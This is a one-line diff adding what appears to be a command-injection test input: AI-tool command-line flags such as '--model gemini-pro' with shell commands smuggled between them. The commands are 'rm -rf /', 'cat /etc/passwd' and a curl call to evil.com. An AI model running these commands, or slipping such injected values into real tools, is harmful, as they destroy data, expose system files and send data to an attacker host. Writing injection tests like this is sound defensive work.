@@ -1,0 +1,1 @@
+--model gemini-pro';rm -rf /;--temperature 1';cat /etc/passwd;--max-tokens 1000';curl http://evil.com/steal;--help
